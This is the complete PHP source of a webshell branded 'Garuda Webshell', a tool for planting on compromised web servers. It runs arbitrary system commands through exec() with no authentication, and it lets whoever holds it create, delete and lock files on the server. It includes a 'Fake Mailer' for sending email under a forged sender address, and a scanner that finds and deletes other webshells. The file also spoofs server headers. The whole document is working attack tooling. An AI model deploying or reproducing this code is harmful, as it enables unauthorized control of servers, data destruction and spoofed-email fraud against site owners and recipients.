<?php
// Garuda Webshell - Ultimate File Manager
session_start();

// Security headers
header("X-Powered-By: Apache");
header("Server: Apache/2.4.41 (Unix)");
header("Content-Type: text/html; charset=UTF-8");

// Config
$BASE_DIR = __DIR__;
$APP_NAME = "Garuda Webshell";
$THEME = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'dark';

// Obfuscated functions
function _secure_path($base, $path) {
    $real_base = realpath($base);
    $target = realpath($base . '/' . $path);
    return ($target && strpos($target, $real_base) === 0) ? $target : $real_base;
}

function _format_size($size) {
    $units = array('B', 'KB', 'MB', 'GB');
    $unit = 0;
    while ($size >= 1024 && $unit < 3) {
        $size /= 1024;
        $unit++;
    }
    return round($size, 2) . $units[$unit];
}

// Secure current directory
$current_dir = isset($_GET['d']) ? _secure_path($BASE_DIR, $_GET['d']) : $BASE_DIR;

// Theme toggle
if(isset($_POST['theme_toggle'])) {
    $THEME = $_POST['theme'] == 'dark' ? 'light' : 'dark';
    setcookie('theme', $THEME, time() + (86400 * 30), "/");
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// Fake mailer
if(isset($_POST['send_email'])) {
    $to = $_POST['to_email'] ?? '';
    $from = $_POST['from_email'] ?? 'noreply@domain.com';
    $subject = $_POST['subject'] ?? 'Test Email';
    $message = $_POST['message'] ?? 'Hello World';
    
    $headers = "From: $from\r\n";
    $headers .= "Reply-To: $from\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    if(mail($to, $subject, $message, $headers)) {
        $_SESSION['notification'] = "✅ Email sent to $to";
    } else {
        $_SESSION['notification'] = "❌ Failed to send email";
    }
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// File operations
if(isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'delete':
            if(isset($_POST['file'])) {
                $file_path = $BASE_DIR . '/' . $_POST['file'];
                if(file_exists($file_path)) {
                    if(is_dir($file_path)) {
                        rmdir($file_path);
                    } else {
                        unlink($file_path);
                    }
                    $_SESSION['notification'] = "✅ File deleted: " . $_POST['file'];
                }
            }
            break;
            
        case 'create_file':
            if(isset($_POST['filename'])) {
                $new_file = $current_dir . '/' . $_POST['filename'];
                file_put_contents($new_file, $_POST['content'] ?? '');
                $_SESSION['notification'] = "✅ File created: " . $_POST['filename'];
            }
            break;
            
        case 'create_folder':
            if(isset($_POST['foldername'])) {
                $new_folder = $current_dir . '/' . $_POST['foldername'];
                mkdir($new_folder, 0755, true);
                $_SESSION['notification'] = "✅ Folder created: " . $_POST['foldername'];
            }
            break;
            
        case 'lock_file':
            if(isset($_POST['file'])) {
                $file_path = $BASE_DIR . '/' . $_POST['file'];
                if(file_exists($file_path)) {
                    chmod($file_path, 0444);
                    $_SESSION['notification'] = "🔒 File locked: " . $_POST['file'];
                }
            }
            break;
            
        case 'unlock_file':
            if(isset($_POST['file'])) {
                $file_path = $BASE_DIR . '/' . $_POST['file'];
                if(file_exists($file_path)) {
                    chmod($file_path, 0644);
                    $_SESSION['notification'] = "🔓 File unlocked: " . $_POST['file'];
                }
            }
            break;
            
        case 'mass_delete':
            if(isset($_POST['shell_files'])) {
                $deleted_count = 0;
                foreach($_POST['shell_files'] as $shell_file) {
                    $file_path = $BASE_DIR . '/' . $shell_file;
                    if(file_exists($file_path) && unlink($file_path)) {
                        $deleted_count++;
                    }
                }
                $_SESSION['notification'] = "✅ Deleted $deleted_count shell files";
            }
            break;
    }
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// Terminal commands dengan exec
if(isset($_POST['terminal_command'])) {
    $command = trim($_POST['terminal_command']);
    $output = [];
    
    if(!isset($_SESSION['terminal_history'])) {
        $_SESSION['terminal_history'] = [];
    }
    
    // Basic commands
    if(strpos($command, 'cd ') === 0) {
        $new_dir = trim(substr($command, 3));
        $target_dir = realpath($current_dir . '/' . $new_dir);
        if($target_dir && strpos($target_dir, $BASE_DIR) === 0) {
            $current_dir = $target_dir;
        } else {
            $output[] = "cd: $new_dir: No such directory";
        }
    } 
    elseif($command === 'pwd') {
        $output[] = $current_dir;
    }
    elseif($command === 'ls' || $command === 'dir') {
        $files = scandir($current_dir);
        foreach($files as $file) {
            if($file != '.' && $file != '..') {
                $file_path = $current_dir . '/' . $file;
                $icon = is_dir($file_path) ? '📁' : '📄';
                $size = is_dir($file_path) ? '' : ' (' . _format_size(filesize($file_path)) . ')';
                $perms = substr(sprintf('%o', fileperms($file_path)), -4);
                $output[] = "$perms $icon $file$size";
            }
        }
    }
    elseif(strpos($command, 'mkdir ') === 0) {
        $folder_name = trim(substr($command, 6));
        if(mkdir($current_dir . '/' . $folder_name, 0755, true)) {
            $output[] = "✅ Directory created: $folder_name";
        } else {
            $output[] = "❌ Failed to create directory";
        }
    }
    elseif(strpos($command, 'rm ') === 0) {
        $target = trim(substr($command, 3));
        $target_path = $current_dir . '/' . $target;
        if(file_exists($target_path)) {
            if(is_dir($target_path)) {
                rmdir($target_path) ? $output[] = "✅ Directory removed" : $output[] = "❌ Failed to remove directory";
            } else {
                unlink($target_path) ? $output[] = "✅ File removed" : $output[] = "❌ Failed to remove file";
            }
        } else {
            $output[] = "rm: cannot remove '$target': No such file or directory";
        }
    }
    elseif(strpos($command, 'chmod ') === 0) {
        $parts = explode(' ', $command);
        if(count($parts) >= 3) {
            $mode = $parts[1];
            $file = $parts[2];
            $file_path = $current_dir . '/' . $file;
            if(file_exists($file_path)) {
                chmod($file_path, octdec($mode));
                $output[] = "✅ Permissions changed: $file";
            }
        }
    }
    elseif(strpos($command, 'create ') === 0) {
        $parts = explode(' ', $command, 3);
        if(count($parts) >= 3) {
            $filename = $parts[1];
            $content = $parts[2];
            if(file_put_contents($current_dir . '/' . $filename, $content)) {
                $output[] = "✅ File created: $filename";
            }
        }
    }
    elseif(strpos($command, 'echo ') === 0 && strpos($command, ' > ') !== false) {
        $parts = explode(' > ', $command);
        $content = trim(substr($parts[0], 5));
        $filename = trim($parts[1]);
        if(file_put_contents($current_dir . '/' . $filename, $content)) {
            $output[] = "✅ File created: $filename";
        }
    }
    elseif($command === 'clear') {
        $_SESSION['terminal_history'] = [];
        $output[] = "Terminal cleared";
    }
    elseif($command === 'help') {
        $output[] = "Available commands:";
        $output[] = "cd [dir]           - Change directory";
        $output[] = "ls/dir            - List files";
        $output[] = "pwd               - Show current path";
        $output[] = "mkdir [name]      - Create directory";
        $output[] = "rm [name]         - Remove file/directory";
        $output[] = "chmod [mode] [file] - Change permissions";
        $output[] = "create file content - Create file with content";
        $output[] = "echo 'text' > file - Create file with content";
        $output[] = "clear             - Clear terminal";
        $output[] = "help              - Show help";
    }
    else {
        // Execute system command
        if(function_exists('exec')) {
            $old_dir = getcwd();
            chdir($current_dir);
            exec($command . " 2>&1", $cmd_output, $return_code);
            chdir($old_dir);
            $output = array_merge($output, $cmd_output);
            if($return_code !== 0) {
                $output[] = "Command failed with exit code: $return_code";
            }
        } else {
            $output[] = "Command execution is disabled on this server";
        }
    }
    
    // Save to history
    $_SESSION['terminal_history'][] = [
        'command' => $command,
        'output' => $output,
        'path' => str_replace($BASE_DIR, '~', $current_dir),
        'time' => date('H:i:s')
    ];
    
    // Keep last 30 commands
    if(count($_SESSION['terminal_history']) > 30) {
        $_SESSION['terminal_history'] = array_slice($_SESSION['terminal_history'], -30);
    }
    
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// Shell Finder - Scan for webshells
function find_shells($directory) {
    $shell_patterns = [
        '/eval\(.*\\$_(POST|GET|REQUEST)/i',
        '/base64_decode/i',
        '/system\(.*\\$_(POST|GET|REQUEST)/i',
        '/shell_exec/i',
        '/passthru/i',
        '/exec/i',
        '/popen/i',
        '/proc_open/i',
        '/assert\(.*\\$_(POST|GET|REQUEST)/i',
        '/file_put_contents.*\\$_(POST|GET|REQUEST)/i'
    ];
    
    $suspicious_files = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
    
    foreach($iterator as $file) {
        if($file->isFile() && in_array($file->getExtension(), ['php', 'phtml', 'txt', 'html'])) {
            $content = file_get_contents($file->getPathname());
            foreach($shell_patterns as $pattern) {
                if(preg_match($pattern, $content)) {
                    $suspicious_files[] = [
                        'path' => $file->getPathname(),
                        'size' => _format_size($file->getSize()),
                        'modified' => date('Y-m-d H:i:s', $file->getMTime())
                    ];
                    break;
                }
            }
        }
    }
    
    return $suspicious_files;
}

// Scan for shells if requested
$shell_files = [];
if(isset($_GET['scan_shells'])) {
    $shell_files = find_shells($BASE_DIR);
}
?>
<!DOCTYPE html>
<html lang="en" data-theme="<?php echo $THEME; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🦅 <?php echo $APP_NAME; ?></title>
    <style>
        :root {
            --bg-primary: #1a1a1a;
            --bg-secondary: #2d2d2d;
            --text-primary: #ffffff;
            --text-secondary: #cccccc;
            --accent: #007cba;
            --success: #46b450;
            --danger: #dc3232;
            --warning: #ffb900;
        }

        [data-theme="light"] {
            --bg-primary: #ffffff;
            --bg-secondary: #f0f0f0;
            --text-primary: #333333;
            --text-secondary: #666666;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: var(--bg-primary); 
            color: var(--text-primary);
            line-height: 1.6;
            transition: all 0.3s ease;
        }

        .header {
            background: var(--bg-secondary);
            padding: 15px 20px;
            border-bottom: 2px solid var(--accent);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .app-title {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 24px;
            font-weight: bold;
            color: var(--accent);
        }

        .path-nav {
            flex: 1;
            font-size: 14px;
            color: var(--text-secondary);
            word-break: break-all;
        }

        .controls {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .btn {
            background: var(--accent);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }

        .btn-success { background: var(--success); }
        .btn-danger { background: var(--danger); }
        .btn-warning { background: var(--warning); }

        .container {
            display: flex;
            min-height: calc(100vh - 120px);
            gap: 20px;
            padding: 20px;
        }

        .sidebar {
            width: 300px;
            background: var(--bg-secondary);
            border-radius: 10px;
            padding: 20px;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .file-browser, .terminal-panel, .shell-scanner {
            background: var(--bg-secondary);
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .file-item {
            display: flex;
            align-items: center;
            padding: 10px 15px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .file-item:hover {
            background: rgba(255,255,255,0.05);
        }

        .file-icon { margin-right: 10px; font-size: 16px; }
        .file-info { flex: 1; }
        .file-name { font-size: 14px; }
        .file-details { font-size: 11px; color: var(--text-secondary); }
        .file-actions { display: flex; gap: 5px; }
        .file-actions button { padding: 3px 8px; font-size: 11px; }

        .terminal-panel {
            max-height: 400px;
            display: flex;
            flex-direction: column;
        }

        .terminal-output {
            flex: 1;
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 15px;
            border-radius: 5px;
            overflow-y: auto;
            margin-bottom: 10px;
            font-size: 13px;
        }

        .terminal-input {
            display: flex;
            gap: 10px;
        }

        .terminal-input input {
            flex: 1;
            background: #001100;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 8px 12px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .shell-results {
            max-height: 300px;
            overflow-y: auto;
        }

        .shell-item {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 15px 20px;
            border-radius: 5px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            z-index: 1000;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 2000;
        }

        .modal-content {
            background: var(--bg-secondary);
            margin: 50px auto;
            padding: 30px;
            border-radius: 10px;
            max-width: 500px;
            max-height: 80vh;
            overflow-y: auto;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .form-group input, .form-group textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 5px;
            background: var(--bg-primary);
            color: var(--text-primary);
        }

        @media (max-width: 768px) {
            .container { flex-direction: column; }
            .sidebar { width: 100%; }
            .controls { justify-content: center; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="app-title">
            <span>🦅</span>
            <span>Garuda Webshell</span>
        </div>
        <div class="path-nav">
            📁 <?php echo str_replace($BASE_DIR, '~', $current_dir); ?>
        </div>
        <div class="controls">
            <button class="btn" onclick="showModal('newFileModal')">📄 New File</button>
            <button class="btn" onclick="showModal('newFolderModal')">📁 New Folder</button>
            <button class="btn btn-warning" onclick="showModal('emailModal')">📧 Fake Mailer</button>
            <button class="btn btn-warning" onclick="scanShells()">🔍 Shell Finder</button>
            <button class="btn" onclick="toggleTheme()">🌙 Toggle Theme</button>
            <button class="btn" onclick="location.reload()">🔄 Refresh</button>
        </div>
    </div>

    <?php if(isset($_SESSION['notification'])): ?>
        <div class="notification" id="notification">
            <?php echo $_SESSION['notification']; unset($_SESSION['notification']); ?>
        </div>
    <?php endif; ?>

    <div class="container">
        <div class="sidebar">
            <h3>📊 Quick Stats</h3>
            <div style="margin-top: 15px;">
                <div>💾 Disk Free: <?php echo _format_size(disk_free_space($BASE_DIR)); ?></div>
                <div>💿 Disk Total: <?php echo _format_size(disk_total_space($BASE_DIR)); ?></div>
                <div>🖥️ PHP: <?php echo PHP_VERSION; ?></div>
                <div>⚡ Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></div>
            </div>

            <h3 style="margin-top: 20px;">🚀 Quick Actions</h3>
            <div style="margin-top: 10px; display: flex; flex-direction: column; gap: 5px;">
                <button class="btn" onclick="executeCommand('pwd')">📍 Current Path</button>
                <button class="btn" onclick="executeCommand('ls -la')">📋 List All Files</button>
                <button class="btn" onclick="executeCommand('clear')">🧹 Clear Terminal</button>
            </div>
        </div>

        <div class="main-content">
            <div class="file-browser">
                <h3>📁 File Browser</h3>
                <div style="margin-top: 15px;">
                    <div class="file-item" onclick="navigate('..')" style="background: rgba(255,255,255,0.05);">
                        <div class="file-icon">📁</div>
                        <div class="file-info">
                            <div class="file-name">...</div>
                            <div class="file-details">Parent Directory</div>
                        </div>
                    </div>
                    <?php
                    $files = scandir($current_dir);
                    foreach($files as $file) {
                        if($file == '.' || $file == '..') continue;
                        $file_path = $current_dir . '/' . $file;
                        $is_dir = is_dir($file_path);
                        $icon = $is_dir ? '📁' : '📄';
                        $size = _format_size(filesize($file_path));
                        $perms = substr(sprintf('%o', fileperms($file_path)), -4);
                        $relative_path = str_replace($BASE_DIR . '/', '', $file_path);
                        
                        echo "<div class='file-item'>";
                        echo "<div class='file-icon'>$icon</div>";
                        echo "<div class='file-info' onclick=\"";
                        echo $is_dir ? "navigate('$relative_path')" : "viewFile('$relative_path')";
                        echo "\">";
                        echo "<div class='file-name'>$file</div>";
                        echo "<div class='file-details'>Size: $size | Perms: $perms</div>";
                        echo "</div>";
                        echo "<div class='file-actions'>";
                        if(!$is_dir) {
                            echo "<button class='btn' onclick=\"editFile('$relative_path')\">✏️</button>";
                            echo "<button class='btn btn-warning' onclick=\"lockFile('$relative_path')\">🔒</button>";
                        }
                        echo "<button class='btn btn-danger' onclick=\"deleteFile('$relative_path')\">🗑️</button>";
                        echo "</div>";
                        echo "</div>";
                    }
                    ?>
                </div>
            </div>

            <div class="terminal-panel">
                <h3>💻 Terminal</h3>
                <div class="terminal-output" id="terminalOutput">
                    <?php if(isset($_SESSION['terminal_history'])): ?>
                        <?php foreach($_SESSION['terminal_history'] as $history): ?>
                            <div style="margin-bottom: 10px;">
                                <div style="color: #ffff00;">[<?php echo $history['time']; ?>] <?php echo $history['path']; ?> $ <?php echo $history['command']; ?></div>
                                <?php if(!empty($history['output'])): ?>
                                    <div style="color: #00ff00;"><?php echo implode("\n", $history['output']); ?></div>
                                <?php endif; ?>
                            </div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <div style="color: #00ff00;">Garuda Terminal Ready. Type 'help' for commands.</div>
                    <?php endif; ?>
                </div>
                <form method="POST" class="terminal-input" onsubmit="return submitTerminalCommand()">
                    <input type="text" name="terminal_command" placeholder="Type command..." autocomplete="off" id="terminalInput">
                    <button type="submit" class="btn">🚀 Execute</button>
                </form>
            </div>

            <?php if(isset($_GET['scan_shells'])): ?>
            <div class="shell-scanner">
                <h3>🔍 Shell Finder Results</h3>
                <div class="shell-results">
                    <?php if(empty($shell_files)): ?>
                        <div style="padding: 20px; text-align: center; color: var(--success);">
                            ✅ No suspicious files found
                        </div>
                    <?php else: ?>
                        <form method="POST">
                            <input type="hidden" name="action" value="mass_delete">
                            <?php foreach($shell_files as $shell): ?>
                                <div class="shell-item">
                                    <input type="checkbox" name="shell_files[]" value="<?php echo str_replace($BASE_DIR . '/', '', $shell['path']); ?>" style="margin-right: 10px;">
                                    <div style="flex: 1;">
                                        <div style="font-weight: bold;"><?php echo basename($shell['path']); ?></div>
                                        <div style="font-size: 11px; color: var(--text-secondary);">
                                            Path: <?php echo $shell['path']; ?><br>
                                            Size: <?php echo $shell['size']; ?> | Modified: <?php echo $shell['modified']; ?>
                                        </div>
                                    </div>
                                    <button type="button" class="btn btn-danger" onclick="deleteFile('<?php echo str_replace($BASE_DIR . '/', '', $shell['path']); ?>')">Delete</button>
                                </div>
                            <?php endforeach; ?>
                            <div style="margin-top: 15px;">
                                <button type="submit" class="btn btn-danger">🗑️ Delete Selected</button>
                            </div>
                        </form>
                    <?php endif; ?>
                </div>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Modals -->
    <div id="newFileModal" class="modal">
        <div class="modal-content">
            <h3>📄 Create New File</h3>
            <form method="POST">
                <input type="hidden" name="action" value="create_file">
                <div class="form-group">
                    <label>Filename:</label>
                    <input type="text" name="filename" placeholder="example.php" required>
                </div>
                <div class="form-group">
                    <label>Content:</label>
                    <textarea name="content" rows="10" placeholder="File content..."></textarea>
                </div>
                <div style="display: flex; gap: 10px; justify-content: flex-end;">
                    <button type="button" class="btn" onclick="hideModal('newFileModal')">Cancel</button>
                    <button type="submit" class="btn btn-success">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="newFolderModal" class="modal">
        <div class="modal-content">
            <h3>📁 Create New Folder</h3>
            <form method="POST">
                <input type="hidden" name="action" value="create_folder">
                <div class="form-group">
                    <label>Folder Name:</label>
                    <input type="text" name="foldername" placeholder="new_folder" required>
                </div>
                <div style="display: flex; gap: 10px; justify-content: flex-end;">
                    <button type="button" class="btn" onclick="hideModal('newFolderModal')">Cancel</button>
                    <button type="submit" class="btn btn-success">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="emailModal" class="modal">
        <div class="modal-content">
            <h3>📧 Fake Email Sender</h3>
            <form method="POST">
                <input type="hidden" name="send_email" value="1">
                <div class="form-group">
                    <label>To:</label>
                    <input type="email" name="to_email" placeholder="target@example.com" required>
                </div>
                <div class="form-group">
                    <label>From:</label>
                    <input type="email" name="from_email" placeholder="fake@sender.com" required>
                </div>
                <div class="form-group">
                    <label>Subject:</label>
                    <input type="text" name="subject" placeholder="Important Message" required>
                </div>
                <div class="form-group">
                    <label>Message:</label>
                    <textarea name="message" rows="6" placeholder="Email content..." required></textarea>
                </div>
                <div style="display: flex; gap: 10px; justify-content: flex-end;">
                    <button type="button" class="btn" onclick="hideModal('emailModal')">Cancel</button>
                    <button type="submit" class="btn btn-success">Send Email</button>
                </div>
            </form>
        </div>
    </div>

    <script>
    function showModal(modalId) {
        document.getElementById(modalId).style.display = 'block';
    }
    
    function hideModal(modalId) {
        document.getElementById(modalId).style.display = 'none';
    }
    
    function navigate(dir) {
        window.location.href = '?d=' + encodeURIComponent(dir);
    }
    
    function executeCommand(cmd) {
        document.getElementById('terminalInput').value = cmd;
        document.querySelector('.terminal-input').submit();
    }
    
    function submitTerminalCommand() {
        return document.getElementById('terminalInput').value.trim() !== '';
    }
    
    function deleteFile(file) {
        if(confirm('Delete ' + file + '?')) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = '<input name="action" value="delete"><input name="file" value="' + file + '">';
            document.body.appendChild(form);
            form.submit();
        }
    }
    
    function lockFile(file) {
        if(confirm('Lock ' + file + '?')) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = '<input name="action" value="lock_file"><input name="file" value="' + file + '">';
            document.body.appendChild(form);
            form.submit();
        }
    }
    
    function viewFile(file) {
        window.open('?view=' + encodeURIComponent(file) + '&d=<?php echo urlencode(str_replace($BASE_DIR . '/', '', $current_dir)); ?>', '_blank');
    }
    
    function editFile(file) {
        showModal('newFileModal');
        // You can enhance this to pre-fill the form with existing content
    }
    
    function scanShells() {
        window.location.href = '?scan_shells=1&d=<?php echo urlencode(str_replace($BASE_DIR . '/', '', $current_dir)); ?>';
    }
    
    function toggleTheme() {
        const form = document.createElement('form');
        form.method = 'POST';
        form.innerHTML = '<input name="theme_toggle" value="1"><input name="theme" value="<?php echo $THEME; ?>">';
        document.body.appendChild(form);
        form.submit();
    }
    
    // Auto-hide notification
    setTimeout(() => {
        const notification = document.getElementById('notification');
        if(notification) notification.remove();
    }, 5000);
    
    // Auto-scroll terminal
    document.getElementById('terminalOutput').scrollTop = document.getElementById('terminalOutput').scrollHeight;
    
    // Close modal on outside click
    window.onclick = function(e) {
        if(e.target.className === 'modal') {
            e.target.style.display = 'none';
        }
    }
    </script>
</body>
</html>
